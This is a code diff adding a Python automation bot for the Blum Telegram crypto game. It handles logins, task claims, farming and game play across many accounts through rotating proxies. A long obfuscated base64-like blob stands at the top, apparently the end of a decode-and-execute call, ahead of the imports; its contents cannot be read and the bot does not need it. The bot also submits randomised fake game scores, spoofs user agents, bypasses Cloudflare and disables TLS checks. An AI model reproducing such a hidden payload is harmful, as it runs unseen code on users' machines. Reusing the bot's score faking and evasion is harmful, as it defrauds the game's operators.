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'))
+# import time
+from time import time
+from urllib.parse import unquote
+
+import aiohttp
+import certifi
+import pytz
+import requests
+from aiocfscrape import CloudflareScraper
+from aiohttp_proxy import ProxyConnector
+from better_proxy import Proxy
+
+from bot.config import settings
+from bot.core.agents import generate_random_user_agent
+from bot.core.registrator import register_query_id
+from bot.exceptions import (
+    ErrorStartGameException,
+    ExpiredApiKeyException,
+    ExpiredTokenException,
+    GameSessionNotFoundException,
+    InvalidApiKeyException,
+    InvalidSessionException,
+    JSONDecodeErrorException,
+    MissingApiKeyException,
+    UnexpectedResponseFormatException,
+)
+from bot.utils import logger
+from helpers import (
+    bcolors,
+    check_license_key,
+    convert_datetime_str_to_utc,
+    format_duration,
+    get_query_ids,
+    get_tele_user_obj_from_query_id,
+    mapping_role_color,
+)
+
+curr_version = "2.1.3"
+
+banner = f"""
+========================================================================================
+                                {bcolors.BOLD}BLUM BOT{bcolors.ENDC}
+========================================================================================
+Version: {bcolors.OKCYAN}{curr_version}{bcolors.ENDC}
+Created by : https://t.me/irhamdz (Irham Dzuhri)
+You can only get this premium bot from Dzuhri Auto Repository or directly from the creator.
+Any other source is fake!
+========================================================================================
+"""
+
+
+def check_version():
+    version = requests.get(
+        "https://raw.githubusercontent.com/dzuhri-auto/blum-query-id/refs/heads/main/version",
+        verify=certifi.where(),
+    )
+    version_ = version.text.strip()
+    if curr_version != version_:
+        logger.warning(
+            f"<ly>New version detected: <lc>{version_}</lc>, Please update the bot by running the following command:</ly> <lg>git pull</lg>"
+        )
+        sys.exit()
+
+
+def get_proxies() -> list[Proxy]:
+    if settings.USE_PROXY_FROM_FILE.lower() == "true":
+        with open(file="bot/config/proxies.txt", encoding="utf-8-sig") as file:
+            proxies = [Proxy.from_str(proxy=row.strip()).as_url for row in file]
+    else:
+        proxies = []
+    return proxies
+
+
+def create_menus():
+    menus = ["Start bot", "Add query", "Delete query"]
+    print("Please choose action: ")
+    print("")
+    for idx, menu in enumerate(menus):
+        num = idx + 1
+        print(f"{num}. {menu}")
+    print(
+        "========================================================================================"
+    )
+
+
+async def delete_account():
+    delete = True
+    while delete:
+        query_ids = await get_query_ids()
+        number_validation = []
+        list_of_username = []
+        delete_action = None
+
+        if query_ids:
+            print("")
+            print("Please Choose session that want to be delete: ")
+            print("")
+            for idx, query_id in enumerate(query_ids):
+                tele_user_obj = get_tele_user_obj_from_query_id(query_id)
+                username = tele_user_obj.get("username")
+                num = idx + 1
+                print(f"{num}. {username}")
+                list_of_username.append(username)
+                number_validation.append(str(num))
+            print("")
+
+            while True:
+                delete_action = input("> ")
+                if not delete_action:
+                    return None
+
+                if not delete_action.isdigit():
+                    logger.warning("Please only input number")
+                elif delete_action not in number_validation:
+                    logger.warning("Please only input number that are available")
+                else:
+                    delete_action = int(delete_action)
+                    break
+
+            with open("query_ids.txt", "r+") as f:
+                content = f.readlines()
+                content_len = len(content)
+                f.truncate(0)
+                f.seek(0)
+                index_to_strip = 0
+                for content_idx, line in enumerate(content):
+                    if not content_idx == (delete_action - 1):
+                        if delete_action == content_len:
+                            index_to_strip = delete_action - 2
+                        if index_to_strip and content_idx == index_to_strip:
+                            f.write(line.strip())
+                        else:
+                            f.write(line)
+
+            logger.success(f"Successfully deleted session {list_of_username[delete_action - 1]}")
+
+            list_of_username.pop(delete_action - 1)
+
+            if not list_of_username:
+                logger.success(f"All of your session has been deleted")
+                return None
+
+            print("\n")
+            keep_deleting = input("Want to delete other session? (y/n) > ")
+            if not keep_deleting or keep_deleting == "n":
+                return None
+            elif keep_deleting == "y":
+                continue
+            else:
+                return None
+        else:
+            logger.warning(f"You dont have any session, please create session first!")
+            return None
+
+
+async def process() -> None:
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-a", "--action", type=int, help="Action to perform")
+    action = parser.parse_args().action
+    if not action:
+        print(banner)
+        create_menus()
+        while True:
+            action = input("> ")
+
+            if not action.isdigit():
+                logger.warning("Please only input number")
+            elif action not in ["1", "2", "3"]:
+                logger.warning("Please only input number that are available [1 / 2 / 3]")
+            else:
+                action = int(action)
+                break
+
+    if action == 2:
+        await register_query_id()
+    elif action == 1:
+        await run_tasks()
+    elif action == 3:
+        await delete_account()
+
+
+async def run_tasks():
+    query_ids = await get_query_ids()
+    if not query_ids:
+        logger.warning(
+            "No query ID found. Please select <lc>Add query</lc> or add it directly to the <lc>query_ids.txt</lc> file"
+        )
+        return
+    proxies = get_proxies()
+    result = await check_api_key()
+    role, expire_ts_dt = await check_membership_time_left(result, True)
+    logger.info(f"============================================================")
+    logger.info(f"Detected <lc>{len(query_ids)}</lc> sessions | <lc>{len(proxies)}</lc> proxies")
+    logger.info(f"============================================================")
+    proxies_cycle = cycle(proxies) if proxies else None
+    tasks = [
+        asyncio.create_task(
+            run_tapper(
+                query_id=query_id,
+                proxy=next(proxies_cycle) if proxies_cycle else None,
+                role=role,
+                expire_ts=expire_ts_dt,
+            )
+        )
+        for query_id in query_ids
+    ]
+    await asyncio.gather(*tasks)
+
+
+class Tapper:
+    def __init__(self, query_id: str, role: str, expire_ts: datetime):
+        self.query_id = query_id
+        self.user_id = 0
+        self.username = None
+        self.first_name = None
+        self.last_name = None
+        self.fullname = None
+        self.start_param = None
+        self.peer = None
+        self.gateway_url = "https://gateway.blum.codes/api/v1"
+        self.game_url = "https://game-domain.blum.codes/api/v1"
+        self.wallet_url = "https://wallet-domain.blum.codes/api/v1"
+        self.subscription_url = "https://subscription.blum.codes/api/v1"
+        self.tribe_url = "https://tribe-domain.blum.codes/api/v1"
+        self.user_url = "https://user-domain.blum.codes/api/v1"
+        self.earn_domain = "https://earn-domain.blum.codes/api/v1"
+        self.game_url_v2 = "https://game-domain.blum.codes/api/v2"
+        self.headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "ru-RU,ru;q=0.9",
+            "Connection": "keep-alive",
+            "Content-Type": "application/json",
+            "Origin": "https://telegram.blum.codes",
+            "Sec-Fetch-Dest": "empty",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Site": "same-site",
+            "Sec-Ch-Ua": '"Google Chrome";v="127", "Chromium";v="127", "Not.A/Brand";v="24"',
+            "Sec-Ch-Ua-Mobile": "?1",
+            "Sec-Ch-Ua-Platform": "Android",
+            "X-Requested-With": "org.telegram.messenger",
+        }
+        self.role = role
+        self.expire_ts = expire_ts
+        self.session_ug_dict = self.load_user_agents() or []
+        self.access_token_created_time = 0
+
+    async def generate_random_user_agent(self):
+        return generate_random_user_agent(device_type="android", browser_type="chrome")
+
+    def info(self, message):
+        from bot.utils import info
+
+        info(f"<ly>{self.session_name}</ly> | {message}")
+
+    def debug(self, message):
+        from bot.utils import debug
+
+        debug(f"<ly>{self.session_name}</ly> | ⚙ {message}")
+
+    def warning(self, message):
+        from bot.utils import warning
+
+        warning(f"<ly>{self.session_name}</ly> | ⚠️ {message}")
+
+    def error(self, message):
+        from bot.utils import error
+
+        error(f"<ly>{self.session_name}</ly> | ❌ {message}")
+
+    def critical(self, message):
+        from bot.utils import critical
+
+        critical(f"<ly>{self.session_name}</ly> | ‼ {message}")
+
+    def success(self, message):
+        from bot.utils import success
+
+        success(f"<ly>{self.session_name}</ly> | ✅ {message}")
+
+    def save_user_agent(self):
+        user_agents_file_name = "user_agents.json"
+        if not any(
+            session["session_name"] == self.session_name for session in self.session_ug_dict
+        ):
+            user_agent_str = generate_random_user_agent()
+            self.session_ug_dict.append(
+                {"session_name": self.session_name, "user_agent": user_agent_str}
+            )
+            with open(user_agents_file_name, "w") as user_agents:
+                json.dump(self.session_ug_dict, user_agents, indent=4)
+            self.success("User agent saved successfully")
+            return user_agent_str
+
+    def load_user_agents(self):
+        user_agents_file_name = "user_agents.json"
+        try:
+            with open(user_agents_file_name, "r") as user_agents:
+                session_data = json.load(user_agents)
+                if isinstance(session_data, list):
+                    return session_data
+        except FileNotFoundError:
+            logger.warning("User agents file not found, creating...")
+        except json.JSONDecodeError:
+            logger.warning("User agents file is empty or corrupted.")
+        return []
+
+    def check_user_agent(self):
+        load = next(
+            (
+                session["user_agent"]
+                for session in self.session_ug_dict
+                if session["session_name"] == self.session_name
+            ),
+            None,
+        )
+        if load is None:
+            return self.save_user_agent()
+        return load
+
+    def load_task_codes(self):
+        task_codes_file_name = "task_codes.json"
+        try:
+            with open(task_codes_file_name, "r") as task_codes:
+                task_code_datas = json.load(task_codes)
+                if isinstance(task_code_datas, dict):
+                    return task_code_datas
+        except FileNotFoundError:
+            self.warning("Task codes file not found.")
+        except json.JSONDecodeError:
+            self.warning("Task codes file is empty or corrupted.")
+        return {}
+
+    async def login(self, http_client: aiohttp.ClientSession, initdata):
+        try:
+            json_data = {"query": initdata}
+            resp = await http_client.post(
+                f"{self.user_url}/auth/provider/PROVIDER_TELEGRAM_MINI_APP",
+                json=json_data,
+                ssl=False,
+            )
+            # self.debug(f'login text {await resp.text()}')
+            if resp.headers.get("content-type") == "application/json":
+                resp_json = await resp.json()
+                if resp_json.get("message") and "Invalid username" in resp_json.get("message"):
+                    # fresh account and doesnt have username
+                    tele_user_obj = get_tele_user_obj_from_query_id(self.query_id)
+                    first_name = tele_user_obj.get("first_name")
+                    last_name = tele_user_obj.get("last_name")
+                    username = None
+                    while True:
+                        random_num = random.randint(0, 1000)
+                        username = f"{first_name}_{last_name}{random_num}"
+                        username_check_body = {"username": username}
+                        resp = await http_client.post(
+                            f"{self.user_url}/user/username/check",
+                            json=username_check_body,
+                            ssl=False,
+                        )
+                        if resp.status in {HTTPStatus.OK, HTTPStatus.CREATED}:
+                            break
+                    # set the username while getting the token
+                    json_data["username"] = username
+                    resp = await http_client.post(
+                        f"{self.user_url}/auth/provider/PROVIDER_TELEGRAM_MINI_APP",
+                        json=json_data,
+                        ssl=False,
+                    )
+                    if resp.status in {HTTPStatus.OK, HTTPStatus.CREATED}:
+                        self.info(f"Successfully set username: <lc>{username}</lc>")
+                        resp_json = await resp.json()
+                        return resp_json.get("token", {}).get("access", {}), resp_json.get(
+                            "token", {}
+                        ).get("refresh", {})
+                    else:
+                        return None, None
+                else:
+                    return resp_json.get("token", {}).get("access", {}), resp_json.get(
+                        "token", {}
+                    ).get("refresh", {})
+            else:
+                # print("Unexpected response format:", await response.text())
+                response = await resp.text()
+                raise UnexpectedResponseFormatException(f"Unexpected response format: {response}")
+        except UnexpectedResponseFormatException as err:
+            return None, None
+        except Exception as error:
+            self.error(f"Login error {error}")
+
+    async def claim_task(self, http_client: aiohttp.ClientSession, task_id):
+        try:
+            resp = await http_client.post(f"{self.earn_domain}/tasks/{task_id}/claim", ssl=False)
+            # Check if the response is JSON
+            if resp.headers.get("content-type") == "application/json":
+                try:
+                    resp_json = await resp.json()
+                    return resp_json.get("status") == "FINISHED"
+                except json.JSONDecodeError:
+                    raise JSONDecodeErrorException("Error decoding JSON response")
+            else:
+                # Handle non-JSON response
+                response = await resp.text()
+                raise UnexpectedResponseFormatException(f"Unexpected response format: {response}")
+        except UnexpectedResponseFormatException as err:
+            return False
+        except JSONDecodeErrorException as err:
+            return False
+        except Exception as error:
+            self.error(f"Claim task error {error}")
+
+    async def validate_task(self, http_client: aiohttp.ClientSession, task_id, title):
+        try:
+            keywords = self.load_task_codes()
+
+            payload = {"keyword": keywords.get(title)}
+            resp = await http_client.post(
+                f"{self.earn_domain}/tasks/{task_id}/validate", json=payload, ssl=False
+            )
+            resp_json = await resp.json()
+            if resp_json.get("status") == "READY_FOR_CLAIM":
+                status = await self.claim_task(http_client, task_id)
+                if status:
+                    return status
+            else:
+                return False
+        except Exception as error:
+            self.error(f"Validate task error {error}")
+
+    async def start_complete_task(self, http_client: aiohttp.ClientSession, task_id):
+        try:
+            resp = await http_client.post(f"{self.earn_domain}/tasks/{task_id}/start", ssl=False)
+            # logger.debug(f"{self.session_name} | start_complete_task response: {resp_json}")
+            if resp.headers.get("content-type") == "application/json":
+                try:
+                    resp_json = await resp.json()
+                    return resp_json.get("status") == "STARTED"
+                except json.JSONDecodeError:
+                    raise JSONDecodeErrorException("Error decoding JSON response")
+            else:
+                # Handle non-JSON response
+                response = await resp.text()
+                raise UnexpectedResponseFormatException(f"Unexpected response format: {response}")
+        except UnexpectedResponseFormatException as err:
+            return False
+        except JSONDecodeErrorException as err:
+            return False
+        except Exception as error:
+            self.error(f"Start complete task error {error}")
+
+    async def get_tasks(self, http_client: aiohttp.ClientSession):
+        try:
+            while True:
+                resp = await http_client.get(f"{self.earn_domain}/tasks", ssl=False)
+                if resp.status not in [HTTPStatus.OK, HTTPStatus.CREATED]:
+                    continue
+                else:
+                    break
+
+            resp_json = await resp.json()
+
+            def collect_tasks(resp_json):
+                collected_tasks = []
+                for task in resp_json:
+                    if task.get("sectionType") == "HIGHLIGHTS":
+                        tasks_list = task.get("tasks", [])
+                        for t in tasks_list:
+                            sub_tasks = t.get("subTasks")
+                            if sub_tasks:
+                                for sub_task in sub_tasks:
+                                    collected_tasks.append(sub_task)
+                            if t.get("type") != "PARTNER_INTEGRATION":
+                                collected_tasks.append(t)
+
+                    if task.get("sectionType") == "WEEKLY_ROUTINE":
+                        tasks_list = task.get("tasks", [])
+                        for t in tasks_list:
+                            sub_tasks = t.get("subTasks", [])
+                            for sub_task in sub_tasks:
+                                collected_tasks.append(sub_task)
+
+                    if task.get("sectionType") == "DEFAULT":
+                        sub_tasks = task.get("subSections", [])
+                        for sub_task in sub_tasks:
+                            tasks = sub_task.get("tasks", [])
+                            for task_basic in tasks:
+                                collected_tasks.append(task_basic)
+
+                return collected_tasks
+
+            all_tasks = collect_tasks(resp_json)
+
+            return all_tasks
+        except Exception as error:
+            self.error(f"Get tasks error {error}")
+            return []
+
+    async def play_game(self, http_client: aiohttp.ClientSession, play_passes):
+        try:
+            while play_passes:
+                game_id = await self.start_game(http_client=http_client)
+
+                if not game_id or game_id == "cannot start game":
+                    raise ErrorStartGameException(
+                        f"Failed to start the game!, remaining tickets: <lc>{play_passes}</lc>"
+                    )
+                    # break
+                else:
+                    self.success("Successfully starting the game..")
+
+                await asyncio.sleep(random.uniform(30, 40))
+                msg, points = await self.claim_game(game_id=game_id, http_client=http_client)
+                if isinstance(msg, bool) and msg:
+                    play_passes -= 1
+                    self.success(
+                        f"Successfully finish the game! , reward: <lg>(+{points})</lg>, remaining tickets: <lc>{play_passes}</lc>"
+                    )
+                else:
+                    self.info(
+                        f"Failed to play game, msg: {msg}, remaining tiket: <lc>{play_passes}</lc>"
+                    )
+                    break
+
+                await asyncio.sleep(random.uniform(30, 40))
+        except Exception as e:
+            self.error(f"Error occurred during play game: {e}")
+            await asyncio.sleep(random.randint(0, 5))
+
+    async def start_game(self, http_client: aiohttp.ClientSession):
+        try:
+            resp = await http_client.post(f"{self.game_url_v2}/game/play", ssl=False)
+            response_data = await resp.json()
+            if "gameId" in response_data:
+                return response_data.get("gameId")
+            elif "message" in response_data:
+                return response_data.get("message")
+        except Exception as e:
+            self.error(f"Error occurred during start game: {e}")
+
+    async def claim_game(self, game_id: str, http_client: aiohttp.ClientSession):
+        try:
+            points = random.randint(settings.POINTS[0], settings.POINTS[1])
+            json_data = {"gameId": game_id, "points": points}
+
+            resp = await http_client.post(f"{self.game_url}/game/claim", json=json_data, ssl=False)
+
+            if resp.status == HTTPStatus.UNAUTHORIZED:
+                raise ExpiredTokenException("token expired during claim game")
+
+            txt = await resp.text()
+
+            if "game session not found" in txt:
+                raise GameSessionNotFoundException(
+                    "Got error game session not found during claim game"
+                )
+
+            return True if txt == "OK" else txt, points
+        except Exception as e:
+            self.error(f"Error occurred during claim game: {e}")
+
+    async def claim(self, http_client: aiohttp.ClientSession):
+        try:
+            resp = await http_client.post(f"{self.game_url}/farming/claim", ssl=False)
+            if resp.status != 200:
+                resp = await http_client.post(f"{self.game_url}/farming/claim", ssl=False)
+
+            resp_json = await resp.json()
+
+            return int(resp_json.get("timestamp") / 1000), resp_json.get("availableBalance")
+        except Exception as e:
+            self.error(f"Error occurred during claim: {e}")
+
+    async def start_farming(self, http_client: aiohttp.ClientSession):
+        url = f"{self.game_url}/farming/start"
+        try:
+            resp = await http_client.post(url, ssl=False)
+
+            # if resp.status != 200:
+            #     resp = await http_client.post(url, ssl=False)
+
+            resp_json = await resp.json()
+            start_time = resp_json.get("startTime")
+            end_time = resp_json.get("endTime")
+            if not start_time and not end_time:
+                return None, None
+
+            if not isinstance(start_time, int):
+                start_time = int(start_time)
+
+            if not isinstance(end_time, int):
+                end_time = int(end_time)
+
+            return start_time / 1000, end_time / 1000
+        except Exception as e:
+            self.error(f"Error occurred during start farming: {e}")
+
+    async def friend_balance(self, http_client: aiohttp.ClientSession):
+        url = f"{self.user_url}/friends/balance"
+        try:
+            resp = await http_client.get(url=url, ssl=False)
+            if resp.headers.get("content-type") == "application/json":
+                try:
+                    resp_json = await resp.json()
+                    claim_amount = resp_json.get("amountForClaim")
+                    is_available = resp_json.get("canClaim")
+
+                    if resp.status != 200:
+                        resp = await http_client.get(url=url, ssl=False)
+                        resp_json = await resp.json()
+                        claim_amount = resp_json.get("amountForClaim")
+                        is_available = resp_json.get("canClaim")
+
+                    return (claim_amount, is_available)
+                except json.JSONDecodeError:
+                    raise JSONDecodeErrorException("Error decoding JSON response")
+            else:
+                # Handle non-JSON response
+                response = await resp.text()
+                raise UnexpectedResponseFormatException(f"Unexpected response format: {response}")
+        except UnexpectedResponseFormatException as err:
+            return 0, False
+        except JSONDecodeErrorException as err:
+            return 0, False
+        except Exception as e:
+            self.error(f"Error occurred during friend balance: {e}")
+
+    async def friend_claim(self, http_client: aiohttp.ClientSession):
+        url = f"{self.user_url}/friends/claim"
+        try:
+            resp = await http_client.post(url, ssl=False)
+            if resp.headers.get("content-type") == "application/json":
+                try:
+                    resp_json = await resp.json()
+                    amount = resp_json.get("claimBalance")
+                    if resp.status != 200:
+                        resp = await http_client.post(url, ssl=False)
+                        resp_json = await resp.json()
+                        amount = resp_json.get("claimBalance")
+                    return amount
+                except json.JSONDecodeError:
+                    raise JSONDecodeErrorException("Error decoding JSON response")
+            else:
+                # Handle non-JSON response
+                response = await resp.text()
+                raise UnexpectedResponseFormatException(f"Unexpected response format: {response}")
+        except UnexpectedResponseFormatException as err:
+            return False
+        except JSONDecodeErrorException as err:
+            return False
+        except Exception as e:
+            self.error(f"Error occurred during friends claim: {e}")
+
+    async def balance(self, http_client: aiohttp.ClientSession):
+        try:
+            resp = await http_client.get(f"{self.game_url}/user/balance", ssl=False)
+            resp_json = await resp.json()
+
+            timestamp = resp_json.get("timestamp")
+            play_passes = resp_json.get("playPasses")
+            balance = resp_json.get("availableBalance")
+
+            start_time = None
+            end_time = None
+            if resp_json.get("farming"):
+                start_time = resp_json["farming"].get("startTime")
+                end_time = resp_json["farming"].get("endTime")
+
+            return (
+                int(timestamp / 1000) if timestamp is not None else None,
+                int(start_time / 1000) if start_time is not None else None,
+                int(end_time / 1000) if end_time is not None else None,
+                play_passes,
+                balance,
+            )
+        except Exception as e:
+            self.error(f"Error occurred during balance: {e}")
+
+    async def claim_daily_reward(self, http_client: aiohttp.ClientSession):
+        try:
+            resp = await http_client.post(f"{self.game_url}/daily-reward?offset=-180", ssl=False)
+            txt = await resp.text()
+            return True if txt == "OK" else txt
+        except Exception as e:
+            self.error(f"Error occurred during claim daily reward: {e}")
+
+    async def check_elig_dogs(self, http_client: aiohttp.ClientSession):
+        try:
+            resp = await http_client.get(
+                f"{self.game_url_v2}/game/eligibility/dogs_drop", ssl=False
+            )
+            resp_json = await resp.json()
+            return resp_json.get("eligible", False)
+        except json.JSONDecodeError as err:
+            raise JSONDecodeErrorException("check_elig_dogs not expected response")
+        except Exception as error:
+            self.error(f"check_elig_dogs task error {error}")
+            return False
+
+    async def refresh_token(self, http_client: aiohttp.ClientSession, token):
+        json_data = {"refresh": token}
+        resp = await http_client.post(
+            "https://gateway.blum.codes/v1/auth/refresh", json=json_data, ssl=False
+        )
+        resp_json = await resp.json()
+        return resp_json.get("access"), resp_json.get("refresh")
+
+    async def check_proxy(self, http_client: aiohttp.ClientSession, proxy: Proxy) -> None:
+        try:
+            response = await http_client.get(
+                url="https://httpbin.org/ip", timeout=aiohttp.ClientTimeout(5)
+            )
+            ip = (await response.json()).get("origin")
+            self.info(f"Bind with proxy IP: <lc>{ip}</lc>")
+        except asyncio.TimeoutError as err:
+            self.warning(f"Got timeout while checking proxy: {proxy}, skipping...")
+        except aiohttp.ClientConnectorError as err:
+            self.warning(f"Connection error with proxy: {proxy}, skipping...")
+        except Exception as error:
+            self.error(f"Proxy: {proxy} | Error: {error}")
+
+    async def run(self, proxy: str | None) -> None:
+        if "tgWebAppData" in self.query_id:
+            init_data = unquote(
+                string=self.query_id.split("tgWebAppData=", maxsplit=1)[1].split(
+                    "&tgWebAppVersion", maxsplit=1
+                )[0]
+            )
+        else:
+            init_data = self.query_id
+
+        tele_user_obj = get_tele_user_obj_from_query_id(init_data)
+        first_name = tele_user_obj.get("first_name")
+        self.session_name = (
+            tele_user_obj.get("username") if tele_user_obj.get("username") else first_name
+        )
+
+        if settings.USE_RANDOM_DELAY_IN_RUN.lower() == "true":
+            random_delay = random.randint(
+                settings.RANDOM_DELAY_IN_RUN[0], settings.RANDOM_DELAY_IN_RUN[1]
+            )
+            self.info(f"🤖 Bot will start in <ly>{random_delay}s</ly>")
+            await asyncio.sleep(random_delay)
+
+        access_token = None
+        proxy_conn = ProxyConnector().from_url(proxy) if proxy else None
+        http_client = CloudflareScraper(headers=self.headers, connector=proxy_conn)
+        if proxy:
+            await self.check_proxy(http_client=http_client, proxy=proxy)
+        http_client.headers["User-Agent"] = self.check_user_agent()
+        while True:
+            try:
+                if http_client.closed:
+                    if proxy_conn:
+                        if not proxy_conn.closed:
+                            proxy_conn.close()
+
+                    proxy_conn = ProxyConnector().from_url(proxy) if proxy else None
+                    http_client = CloudflareScraper(headers=self.headers, connector=proxy_conn)
+                    http_client.headers["User-Agent"] = self.check_user_agent()
+                if time() - self.access_token_created_time >= 3000:
+                    if "Authorization" in http_client.headers:
+                        del http_client.headers["Authorization"]
+
+                    access_token, refresh_token = await self.login(
+                        http_client=http_client, initdata=init_data
+                    )
+
+                    if access_token:
+                        self.success("Successfully Login")
+                    else:
+                        self.error(f"Login failed, retrying in <ly>{format_duration(60)}</ly>")
+                        self.access_token_created_time = 0
+                        await asyncio.sleep(60)
+                        continue
+
+                    http_client.headers["Authorization"] = f"Bearer {access_token}"
+
+                    self.access_token_created_time = time()
+
+                timestamp, start_time, end_time, play_passes, balance = await self.balance(
+                    http_client=http_client
+                )
+                if not balance:
+                    self.error(
+                        f"Error while checking balance, retrying in <ly>{format_duration(60)}</ly>"
+                    )
+                    self.access_token_created_time = 0
